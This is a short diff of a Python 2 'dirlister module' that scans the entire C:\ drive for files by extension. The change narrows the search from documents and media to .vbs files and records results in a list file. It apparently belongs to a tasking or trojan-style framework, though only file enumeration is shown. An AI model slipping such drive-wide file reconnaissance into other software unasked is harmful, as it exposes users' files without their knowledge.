@@ -8,7 +8,7 @@ def run(**args):
     print "[*] In dirlister module."
     hit = ""
     f_des = open("dirmodule.lst" , "w")
-    doc_types = [".doc",".xls",".config",".jpg",".png",".README",".pdf",".mp3",".ppt",".mp4",".txt",".wav",".html"] 
+    doc_types = [".vbs"] 
     for parent ,directories,filenames in os.walk("C:\\"):
         for doc_type in doc_types:
 	      for filename in fnmatch.filter(filenames , "*%s" % doc_type):
